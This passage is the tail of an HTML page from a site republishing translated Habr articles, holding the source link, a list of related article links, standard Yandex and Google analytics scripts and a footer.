disgusting execution of the main bot. </div><p>Source: <a href="https://habr.com/ru/post/276619/">https://habr.com/ru/post/276619/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../276607/index.html">Performance and memory profiling from multiple viewing angles</a></li>
<li><a href="../276609/index.html">Package Manager opkg. Offline installation of packages in the root file system image</a></li>
<li><a href="../276611/index.html">Criticism of the article ‚ÄúHow to write in C in 2016‚Äù</a></li>
<li><a href="../276613/index.html">Notes of a true architect: just about the most important thing (Part 2)</a></li>
<li><a href="../276617/index.html">Chakra officially adopted by Node.js</a></li>
<li><a href="../276621/index.html">Mitap SPB .NET Community # 9</a></li>
<li><a href="../276623/index.html">Through a filtering proxy using a script in the name of the moon</a></li>
<li><a href="../276629/index.html">Security Week 05: difficult numbers in socat, Virustotal checks the BIOS for bookmarks, the secret life of WiFi modules</a></li>
<li><a href="../276631/index.html">Game Designer Skills</a></li>
<li><a href="../276633/index.html">Compact OS for ARM processors</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>